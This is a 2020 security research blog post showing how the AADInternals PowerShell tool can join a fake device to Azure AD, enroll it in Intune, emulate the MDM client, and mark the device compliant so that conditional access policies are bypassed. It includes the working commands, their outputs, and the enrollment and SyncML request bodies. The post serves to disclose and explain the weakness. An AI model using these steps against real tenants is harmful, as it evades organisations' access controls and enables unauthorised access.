+++
title = "Bypassing conditional access by faking device compliance."
date = "2020-09-06"
lastmod = "2020-09-29"
categories =["blog"]
tags = ["Azure Active Directory","Azure","security","MFA","PRT","MDM","Intune"]
thumbnail = "/images/posts/MDM.png"
+++

In my previous <a href="/post/prt/#creating-your-own-prt" target="_blank">blog</a> I demonstrated how to create
a Persistent Refresh Token (PRT) by joining imaginary device to Azure AD. 

In this blog, with **AADInternals v0.4.2**, I'll show how to make those devices compliant, allowing bypassing compliance related conditional access (CA) policies.

<!--more-->
# What is Conditional Access (CA)

When using cloud services, the security perimeter extends beyond the traditional on-prem network, as users can consume the services anywhere they have access to internet.
As such, organisations are not anymore able to protect their services with traditional methods like firewalls.

However, when users are consuming services such as Office 365, Azure AD receives certains "signals" about the user. These signals are related to the user, user's device, location, etc.

According to the <a href="https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview" target="_blank">documentation</a>:

> Conditional Access is the tool used by Azure Active Directory to bring signals together, to make decisions, and enforce organizational policies. Conditional Access is at the heart of the new identity driven control plane.

The following picture from the same documentation explains the process quite well. Based on the signals, we can configure the Azure AD to allow or deny access to services.

![Conditional Access](/images/posts/conditional-access-overview-how-it-works.png)

One of the typical scenarios is to **grant access** if the **device** used to access the service **is marked as compliant**.

# How is the device marked as compliant?
The device is marked as compliant when it is enrolled to Microsoft <a href="https://docs.microsoft.com/en-us/mem/intune/fundamentals/what-is-intune" target="_blank">Intune</a>, which is 
Microsoft's cloud-based Mobile Device Management (MDM) and Mobile Application Management (MAM) service, and it fulfills the requirements of the defined policies. 
Intune is part <a href="https://www.microsoft.com/microsoft-365/enterprise-mobility-security" target="_blank">Enterprise Mobility + Security (EMS) suite</a>, which means more :dollar: to be spent.

When the device is enrolled to Intune, the device gets a certificate to be used to communicate with Intune. This means that the certificate is the only authentication method used to identify the device.
After enrollment, the device "calls back" to Intune to receive policies and to send information about its state. Intune uses <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mdm/33769a92-ac31-47ef-ae7b-dc8501f7104f" target="_blank">MDM</a> and <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mde2/4d7eadd5-3951-4f1c-8159-c39e07cbe692" target="_blank">MDM 2</a> protocols.

Technically, according to Microsoft <a href="https://docs.microsoft.com/en-us/windows/client-management/mdm/azure-active-directory-integration-with-mdm#use-azure-ad-graph-api" target="_blank">documentation</a>,
the **MDM client** uses AAD Graph API to report to Azure AD the compliance status. 


# Making your device compliant

## Registering device to Azure AD

In the previous <a href="/post/prt/#creating-your-own-prt" target="_blank">blog</a> we joined an imaginary device to Azure AD. Let's go this time a bit further and make the device compliant!

Let's start by getting an access token for joining our device to Azure AD.
{{< highlight powershell >}}
# Get an access token for AAD join and save to cache
Get-AADIntAccessTokenForAADJoin -SaveToCache
{{< /highlight>}}

Now we can join our Commodore 64 to Azure AD!

**Note!** In the Azure AD, the device information such as name and OS version are only informative.
{{< highlight powershell >}}
# Join the device to Azure AD
Join-AADIntDeviceToAzureAD -DeviceName "SixByFour" -DeviceType "Commodore" -OSVersion "C64"
{{< /highlight>}}
Output should be similar to below. The device is now registered to Azure AD and the corresponding certificate 
is saved to the current directory.
``` 
Device successfully registered to Azure AD:
  DisplayName:     "SixByFour"
  DeviceId:        d03994c9-24f8-41ba-a156-1805998d6dc7
  Cert thumbprint: 78CC77315A100089CF794EE49670552485DE3689
  Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7.pfx"
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-797902961-1250002609-2090226073-616445738
  S-1-12-1-3408697635-1121971140-3092833713-2344201430
  S-1-12-1-2007802275-1256657308-2098244751-2635987013
```

Now the device is available at Azure AD devices. But, as we can be see, it is not marked as compliant (yet).

![Azure AD Devices](/images/posts/MDM_1.png)

## Marking device compliant - option 1: Registering device to Intune

The first option to make the device compliant is to enroll it to MDM and **hope that there are no policies assigned**.

So, next we need an access token for Intune MDM. This token **must** have the deviceId claim, so we are using the device certificate to get one (we could also use the PRTToken).

{{< highlight powershell >}}
# Get an access token for Intune MDM and save to cache (prompts for credentials)
Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache 
{{< /highlight>}}

Now that we have the access token, we can enroll the device to Intune:

{{< highlight powershell >}}
# Join the device to Intune
Join-AADIntDeviceToIntune -DeviceName "SixByFour"
{{< /highlight>}}
Output should be similar to below. The device is now enrolled to intune and the corresponding certificate 
is saved to the current directory.
``` 
Intune client certificate successfully created:
  Subject:         "CN=d0d8b466-a652-4534-b7d8-54b4b436358c"
  Issuer:          "CN=Microsoft Intune MDM Device CA"
  Cert thumbprint: 475F772DC6C25E9FA0084D1F2B176883860408EE
  Cert file name:  "987b97c4-edf4-4e2f-9194-1205685de792-MDM.pfx"
  CA file name :   "987b97c4-edf4-4e2f-9194-1205685de792-MDM-CA.der"
  IntMedCA file :  "987b97c4-edf4-4e2f-9194-1205685de792-MDM-INTMED-CA.der"
```

The whole process is as follows.

1. A new RSA key pair is generated for the device.
2. A certificate signing request (CSR) is generated for the device with CN=<deviceId>.
3. A http request is made to "https://fef.&lt;server>.manage.microsoft.com/StatelessEnrollmentService/DeviceEnrollment.svc?client-request-id=&lt;requestId>" to register the device to Intune MDM 

The request body sent to Intune:
{{< highlight xml >}}
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wst="http://docs.oasis-open.org/ws-sx/ws-trust/200512" xmlns:ac="http://schemas.xmlsoap.org/ws/2006/12/authorization">
	<s:Header>
		<a:Action s:mustUnderstand="1">http://schemas.microsoft.com/windows/pki/2009/01/enrollment/RST/wstep</a:Action>
		<a:MessageID>urn:uuid:0d5a1441-5891-453b-becf-a2e5f6ea3749</a:MessageID>
		<a:ReplyTo>
			<a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
		</a:ReplyTo>
		<a:To s:mustUnderstand="1"><!--enrollment service url--></a:To>
		<wsse:Security s:mustUnderstand="1">
			<wsse:BinarySecurityToken ValueType="urn:ietf:params:oauth:token-type:jwt" EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd#base64binary"><!--B64 encoded access token--></wsse:BinarySecurityToken>
		</wsse:Security>
	</s:Header>
	<s:Body>
		<wst:RequestSecurityToken>
			<wst:TokenType>http://schemas.microsoft.com/5.0.0.0/ConfigurationManager/Enrollment/DeviceEnrollmentToken</wst:TokenType>
			<wst:RequestType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/Issue</wst:RequestType>
			<wsse:BinarySecurityToken ValueType="http://schemas.microsoft.com/windows/pki/2009/01/enrollment#PKCS10" EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd#base64binary"><!--B64 encoded CSR--></wsse:BinarySecurityToken>
			<ac:AdditionalContext xmlns="http://schemas.xmlsoap.org/ws/2006/12/authorization">
				<ac:ContextItem Name="UXInitiated">
					<ac:Value>true</ac:Value>
				</ac:ContextItem>
				<ac:ContextItem Name="HWDevID">
					<ac:Value><!--64 char hardware ID--></ac:Value>
				</ac:ContextItem>
				<ac:ContextItem Name="Locale">
					<ac:Value>en-US</ac:Value>
				</ac:ContextItem>
				<ac:ContextItem Name="TargetedUserLoggedIn">
					<ac:Value>true</ac:Value>
				</ac:ContextItem>
				<ac:ContextItem Name="EnrollmentData">
					<ac:Value></ac:Value>
				</ac:ContextItem>
				<ac:ContextItem Name="OSEdition">
					<ac:Value>4</ac:Value>
				</ac:ContextItem>
				<ac:ContextItem Name="DeviceName">
					<ac:Value><!--device name--></ac:Value>
				</ac:ContextItem>
				<ac:ContextItem Name="MAC">
					<ac:Value>00-00-00-00-00-00</ac:Value>
				</ac:ContextItem>
				<ac:ContextItem Name="DeviceID">
					<ac:Value><!--device id--></ac:Value>
				</ac:ContextItem>
				<ac:ContextItem Name="EnrollmentType">
					<ac:Value>Device</ac:Value>
				</ac:ContextItem>
				<ac:ContextItem Name="DeviceType">
					<ac:Value>CIMClient_Windows</ac:Value>
				</ac:ContextItem>
				<ac:ContextItem Name="OSVersion">
					<ac:Value>10.0.18363.0</ac:Value>
				</ac:ContextItem>
				<ac:ContextItem Name="ApplicationVersion">
					<ac:Value>10.0.18363.0</ac:Value>
				</ac:ContextItem>
			</ac:AdditionalContext>
		</wst:RequestSecurityToken>
	</s:Body>
</s:Envelope>
{{< /highlight>}}

Now the device is marked as compliant in Azure AD!

![Azure AD Devices](/images/posts/MDM_2.png)

The same device in Intune portal seems a bit different though:

![IntuneDevices](/images/posts/MDM_3.png)

The name of the device is the default name given by Intune, its ownership state is unknown and the device type is Windows (not Commodore). This is because the in Intune the values
are not only informative and Intune supports only Windows, iOS and Android devices.

We can also see that the device has not checked in at all. So, why is it marked as compliant then? According to <a href="https://docs.microsoft.com/en-us/mem/intune/protect/device-compliance-get-started" target="_blank">documentation</a>,
by default, the compliance status validity period is 30 days. And, as in my demo tenant, there are no compliance policies set for Windows devices so there is nothing to assess.

Anyways, we are not done yet, as we want to set the device name to be same than in Azure AD (SixByFour). As I mentioned earlier, clients are communicating with Intune using MDM protocol,
which utilises <a href="https://docs.microsoft.com/en-us/windows/client-management/mdm/oma-dm-protocol-support" target="_blank">SyncML</a>. SyncML is an xml based language used to synchronise information between two parties.

I was able see the traffic between a Windows 10 VM and Intune with Fiddler by using the MDM certificate for client authentication. However, the content-type used was **application/vnd.syncml.dm+wbxml** which means that the
content was binary xml. Luckily, I had already implemented wbxml support to AADInternasl for Exchange Active Sync so all I had to do was to add new code page. After figuring out the startup
message, I was ready to implement my own Intune "client".

I noticed that Intune should also support non-binary xml, so tried to change the content-type to **application/vnd.syncml.dm+xml** and it worked like a charm! This made debugging a much easier job.

I created the Intune client so that by default it answers to all GET commands with an error code 400 (Bad request) and to all SET, ADD, RESET, and DELETE commands with 200 (All okay). For certain GET commands, like the device name, the 
client answers with 200 using predefined values. 

**Note!** In theory, it would be possible to give back all the right answers that would fulfill any compliance requirement.

So, let's start the call back process (use the -Verbose switch to see what is happening):
{{< highlight powershell >}}
# Start the call back
Start-AADIntDeviceIntuneCallback -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName "SixByFour"
{{< /highlight>}}

And now the device name is correct also in Intune and we can even see the check-in time:

![IntuneDevices](/images/posts/MDM_4.png)

Below we can see the initial SyncML request that starts the call back "discussion":
{{< highlight xml >}}
<SyncML>
	<SyncHdr>
		<VerDTD>1.2</VerDTD>
		<VerProto>DM/1.2</VerProto>
		<SessionID>1</SessionID>
		<MsgID>1</MsgID>
		<Target>
			<LocURI>https://r.manage.microsoft.com/devicegatewayproxy/cimhandler.ashx</LocURI>
		</Target>
		<Source>
			<LocURI>SixByFour</LocURI>
		</Source>
	</SyncHdr>
	<SyncBody>
		<Alert>
			<CmdID>1</CmdID>
			<Data>1201</Data>
		</Alert>
		<Replace>
			<CmdID>2</CmdID>            
			<Item>
				<Source>
					<LocURI>./DevInfo/Mod</LocURI>
				</Source>
				<Data>Virtual Machine</Data>
			</Item>            
			<Item>
				<Source>
					<LocURI>./DevInfo/DevId</LocURI>
				</Source>
				<Data>SixByFour</Data>
			</Item>            
			<Item>
				<Source>
					<LocURI>./DevInfo/Man</LocURI>
				</Source>
				<Data>Microsoft Corporation</Data>
			</Item>            
			<Item>
				<Source>
					<LocURI>./DevInfo/Lang</LocURI>
				</Source>
				<Data>en-US</Data>
			</Item>            
			<Item>
				<Source>
					<LocURI>./DevInfo/DmV</LocURI>
				</Source>
				<Data>1.3</Data>
			</Item>
        </Replace>
		<Final/>
	</SyncBody>
</SyncML>

{{< /highlight>}}

Intune responses by saying that the request was okay (SyncHdr command = 200). Then it asks the values (GET) for certain settings.
{{< highlight xml >}}
<?xml version="1.0" encoding="utf-8"?>
<SyncML xmlns="SYNCML:SYNCML1.2">
	<SyncHdr>
		<VerDTD>1.2</VerDTD>
		<VerProto>DM/1.2</VerProto>
		<SessionID>1</SessionID>
		<MsgID>1</MsgID>
		<Target>
			<LocURI>SixByFour</LocURI>
		</Target>
		<Source>
			<LocURI>https://r.manage.microsoft.com/devicegatewayproxy/cimhandler.ashx</LocURI>
		</Source>
		<Meta>
			<MaxMsgSize xmlns="syncml:metinf">524288</MaxMsgSize>
		</Meta>
	</SyncHdr>
	<SyncBody>
		<Status>
			<CmdID>1</CmdID>
			<MsgRef>1</MsgRef>
			<CmdRef>0</CmdRef>
			<Cmd>SyncHdr</Cmd>
			<Data>200</Data>
		</Status>
		<Get>
			<CmdID>2</CmdID>
			<Item>
				<Target>
					<LocURI>./Vendor/MSFT/NodeCache/MS%20DM%20Server</LocURI>
				</Target>
			</Item>
		</Get>
		<Get>
			<CmdID>3</CmdID>
			<Item>
				<Target>
					<LocURI>./Vendor/MSFT/NodeCache/MS%20DM%20Server/CacheVersion</LocURI>
				</Target>
			</Item>
		</Get>
		<Get>
			<CmdID>4</CmdID>
			<Item>
				<Target>
					<LocURI>./Vendor/MSFT/NodeCache/MS%20DM%20Server/ChangedNodes</LocURI>
				</Target>
			</Item>
		</Get>
		<Get>
			<CmdID>5</CmdID>
			<Item>
				<Target>
					<LocURI>./DevDetail/SwV</LocURI>
				</Target>
			</Item>
		</Get>
		<Get>
			<CmdID>6</CmdID>
			<Item>
				<Target>
					<LocURI>./DevDetail/Ext/Microsoft/LocalTime</LocURI>
				</Target>
			</Item>
		</Get>
		<Get>
			<CmdID>7</CmdID>
			<Item>
				<Target>
					<LocURI>./Vendor/MSFT/WindowsLicensing/Edition</LocURI>
				</Target>
			</Item>
		</Get>
		<Get>
			<CmdID>8</CmdID>
			<Item>
				<Target>
					<LocURI>./Vendor/MSFT/Update/LastSuccessfulScanTime</LocURI>
				</Target>
			</Item>
		</Get>
		<Get>
			<CmdID>9</CmdID>
			<Item>
				<Target>
					<LocURI>./Vendor/MSFT/DeviceStatus/OS/Mode</LocURI>
				</Target>
			</Item>
		</Get>
		<Final />
	</SyncBody>
</SyncML>

{{< /highlight>}}

## Marking device compliant - option 2: AAD Graph API

As I mentioned earlier, <a href="https://docs.microsoft.com/en-us/windows/client-management/mdm/azure-active-directory-integration-with-mdm#use-azure-ad-graph-api" target="_blank">Azure Active Directory integration with MDM</a> documentation
states that MDM clients can report their compliance status to Azure AD. However, the document also states that [Sep 29th 2020]:

> This is only applicable for approved MDM apps on Windows 10 devices.

Wait a minute! Does this mean that the MDM client can directly report its compliance status to Azure AD? Oh yes it does!

Based on my tests, Azure AD doesn't seem to care about which client is reporting the status. In some tenants with some devices
I was able to mark devices compliant as a regular user. However, I couldn't find any logic behind the behaviour, some users were able to do this while others couldn't. 
So this clearly requires more research.

Anyways, AADInternals v0.4.0 contains functions for marking devices compliant and for listing their compliance status.

To check the compliance status of the device, use the following commands:
{{< highlight powershell >}}
# Get access token 
Get-AADIntAccessTokenForAADGraph -SaveToCache

# Get the device compliance
Get-AADIntDeviceCompliance -DeviceId "d03994c9-24f8-41ba-a156-1805998d6dc7"
{{< /highlight>}}

```
displayName           : SixByFour
objectId              : 2eaa21a1-6362-4d3f-afc4-597592217ef0
deviceId              : d03994c9-24f8-41ba-a156-1805998d6dc7
isCompliant           : False
isManaged             : True
deviceOwnership       : Company
deviceManagementAppId : 0000000a-0000-0000-c000-000000000000
```

As we can see, the device is managed but not compliant. To set it compliant, use the following command:
{{< highlight powershell >}}
# Set the device compliant
Set-AADIntDeviceCompliant -DeviceId "d03994c9-24f8-41ba-a156-1805998d6dc7" -Compliant
{{< /highlight>}}
```
displayName           : SixByFour
objectId              : 2eaa21a1-6362-4d3f-afc4-597592217ef0
deviceId              : d03994c9-24f8-41ba-a156-1805998d6dc7
isCompliant           : True
isManaged             : True
deviceOwnership       : Company
deviceManagementAppId : 0000000a-0000-0000-c000-000000000000
```

**Note!** As I mentioned above, this sometimes work, sometimes not. It seems that the user changing
the status should be administrator. I still need to figure out the logic here but
in the mean time feel free to try!

# Summary

Enrolling devices to Intune is a requirement for using the compliance state in Conditional Access (CA) policies. 
As I demonstrated, this does not mean that they would actually be compliant! Emulating Intune client to give Intune "the right answers"
can be used make imaginary devices compliant and to bypass compliance related CA policies.

# References

* Microsoft: <a href="https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview" target="_blank">What is Conditional Access?</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/mem/intune/fundamentals/what-is-intune" target="_blank">Microsoft Intune is an MDM and MAM provider for your devices</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/windows/client-management/mdm/azure-active-directory-integration-with-mdm#use-azure-ad-graph-api" target="_blank">Azure Active Directory integration with MDM</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mdm/33769a92-ac31-47ef-ae7b-dc8501f7104f" target="_blank">[MS-MDM]: Mobile Device Management Protocol</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-mde2/4d7eadd5-3951-4f1c-8159-c39e07cbe692" target="_blank">[MS-MDE2]: Mobile Device Enrollment Protocol Version 2</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/mem/intune/protect/device-compliance-get-started" target="_blank">Use compliance policies to set rules for devices you manage with Intune</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/windows/client-management/mdm/oma-dm-protocol-support" target="_blank">OMA DM protocol support</a>

